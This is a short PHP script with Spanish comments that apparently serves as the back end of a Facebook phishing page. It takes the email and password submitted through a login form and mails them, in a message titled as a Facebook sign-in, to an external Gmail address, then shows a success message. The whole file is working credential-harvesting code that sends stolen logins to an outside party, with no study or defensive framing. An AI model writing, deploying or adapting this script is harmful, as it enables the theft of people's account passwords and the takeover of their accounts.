<?php

// Recibir los datos del formulario
$email = $_POST["email"];
$password = $_POST["password"];

// Enviar los datos al correo
$subject = "Inicio de sesión en Facebook";
$body = "El usuario " . $email . " inició sesión en Facebook con la contraseña " . $password;

mail("desing.pag@gmail.com", $subject, $body);

// Imprimir un mensaje de confirmación
echo "Los datos se enviaron correctamente al correo electrónico.";

?>
